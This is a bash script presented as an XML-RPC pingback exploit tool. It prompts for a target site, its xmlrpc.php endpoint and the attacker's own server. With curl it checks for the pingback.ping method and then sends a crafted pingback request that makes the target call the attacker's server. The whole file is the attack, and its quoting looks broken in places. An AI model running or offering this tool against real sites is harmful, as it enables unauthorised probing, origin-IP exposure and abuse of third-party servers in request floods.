#tool by xskullboyx
# tool for xmlrpc ping back exploit
source color.sh

echo "xmlrpc-ping-exploit"
echo ""
echo "Enter target ex:https://example.com"
read target
echo "Enter vulnerable url ex:https://example.com/xmlrpc.php or http://example.com/xmlrpc.php"
read vlocation
echo ""
echo "Enter your server url"
read url
echo  ""


if curl --silent -H "text/xml" -d "<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" $vlocation | grep "<value><string>pingback.ping</string></value>"
then

   echo  ""
   echo -e "$LPURPLE [*] pingback.ping method found" $RESET
   echo  ""


echo -e "$WHITE Checking pingback request to$RESET $YELLOW $url" $RESET
echo  ""


curl --silent -H "text/xml" -d "<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://$url</string></value></param><param><value><string>$target/</string></value></param></params></methodCall>" $vlocation

echo "exploit completed. check your server for any ping back!"
else

       echo  ""
       echo "$RED pingback.ping method not found at $vlocation. exiting now" $RESET
       echo  ""


fi


#end of code

